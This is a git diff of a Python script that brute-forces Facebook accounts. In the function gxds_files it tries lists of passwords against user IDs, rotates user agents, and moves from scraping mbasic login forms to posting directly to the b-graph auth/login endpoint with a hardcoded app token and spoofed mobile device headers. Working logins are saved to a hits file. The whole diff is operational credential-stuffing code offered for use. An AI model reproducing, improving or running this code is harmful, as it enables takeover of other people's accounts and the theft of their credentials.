@@ -1055,52 +1055,51 @@ cps = []
 def gxds_files(uid, pxss):
     global oks, loop, cps, xprox
     sys.stdout.write( f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "), sys.stdout.flush()
-    session = requests.Session()
+    #session = requests.Session()
     try:
         for ps in pxss:
             qwerty = random.choice(gxdsUArndm)
-            gxdsfbs = session.get("https://mbasic.facebook.com").text
-            dxta = {
-                "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
-                "jazoest": re.search(
-                    'name="jazoest" value="(.*?)"', str(gxdsfbs)
-                ).group(1),
-                "m_ts": re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),
-                "li": re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),
-                "try_number": "0",
-                "unrecognized_tries": "0",
-                "email": uid,
-                "pass": ps,
-                "login": "Log In",
-            }
-            headxr = {
-                "authority": "https://mbasic.facebook.com",
-                "method": "GET",
-                "scheme": "https",
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5758.209", "Google Chrome";v="114.0.5758.209"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"CPH2083"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-                "user-agent": qwerty,
-                'viewport-width': '980',
-            }
-            session.post(
-                url="https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",
-                data=dxta,
-                headers=headxr,
-            ).text
-            lxgin = session.cookies.get_dict().keys()
+            #gxdsfbs = session.get("https://mbasic.facebook.com").text
+            data = {
+            "adid": str(uuid.uuid4()),
+            "format": "json",
+            "device_id": str(uuid.uuid4()),
+            "cpl": "true",
+            "family_device_id": str(uuid.uuid4()),
+            "credentials_type": "device_based_login_password",
+            "error_detail_type": "button_with_disabled",
+            "source": "device_based_login",
+            "email": uid,
+            "password": ps,
+            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+            "generate_session_cookies": "1",
+            "meta_inf_fbmeta": "",
+            "advertiser_id": str(uuid.uuid4()),
+            "currently_logged_in_userid": "0",
+            "locale": "en_GB",
+            "client_country_code": "GB",
+            "method": "auth.login",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "api_key": "882a8490361da98702bf97a021ddc14d"}
+            headers = {
+            'User-Agent': qwerty,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
+            lxgin=json.loads(p)
             if "c_user" in lxgin:
                 print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
